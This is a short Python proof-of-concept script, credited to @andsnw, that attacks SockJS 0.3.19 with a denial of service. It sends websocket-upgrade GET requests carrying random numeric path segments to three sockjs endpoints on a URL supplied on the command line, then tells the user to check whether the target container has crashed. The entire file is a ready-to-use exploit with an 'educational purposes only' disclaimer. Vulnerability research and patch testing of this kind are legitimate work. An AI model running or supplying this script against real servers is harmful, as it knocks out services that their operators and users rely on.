import requests
import random
import argparse

def main():
  print('SockJS 0.3.19 Denial of Service POC')
  print('For educational purposes only')
  print('Author: @andsnw')
  print('------------')
  parser = argparse.ArgumentParser(description='SockJS 0.3.19 Denial of Service POC')
  parser.add_argument('--target', type=str, help='URL of target running vulnerable sockjs')
  parsed = parser.parse_args()
  target = vars(parsed)['target']
  if target == None:
    parser.print_help()
    exit()

  # Clean trailing /
  if target.endswith('/'):
    target = target[:-1]

  print ("Initiating at: %s" % target)

  # Create sockjs payload
  payloads = [
    ('%s/sockjs/' % target),
    ('%s/sockjs/598/' % target),
    ('%s/sockjs/598/8ko8gkpf/' % target),
  ]

  # Run 3 times with traversion
  for url in payloads:
    payload_url = "%s%s" % (url, random.randint(1000000000000000000,9999999999999999999))
    print('Requesting: %s' % payload_url)
    try:
      req = requests.get(url=payload_url, timeout=0.001, headers={
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Cache-Control': 'max-age=0',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'Upgrade',
        'Upgrade': 'websocket',
      })
      print("Status code: %s" % req.status_code)
    except:
      print('Request did not return. Check if the target is down.')

  print ("Complete! Check if the container has crashed")

if __name__ == "__main__":
    main()